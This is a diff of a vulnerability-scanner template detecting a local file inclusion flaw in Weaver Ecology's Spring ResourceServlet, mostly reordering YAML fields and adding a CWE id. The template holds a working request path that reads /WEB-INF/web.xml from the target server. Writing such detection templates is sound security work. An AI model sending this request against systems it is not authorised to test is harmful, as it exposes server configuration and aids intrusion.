@@ -1,5 +1,4 @@
 id: ecology-springframework-directory-traversal
-
 info:
   name: Ecology Springframework - Local File Inclusion
   author: princechaddha
@@ -8,24 +7,20 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23
   metadata:
     max-request: 1
-  tags: ecology,springframework,lfi,vuln
-
+  tags: ecology,lfi,springframework,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
+  - matchers:
+      - status:
           - 200
-
-      - type: word
+        type: status
+      - part: body
+        type: word
         words:
-          - "<url-pattern>/weaver/"
-        part: body
-
+          - <url-pattern>/weaver/
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml'
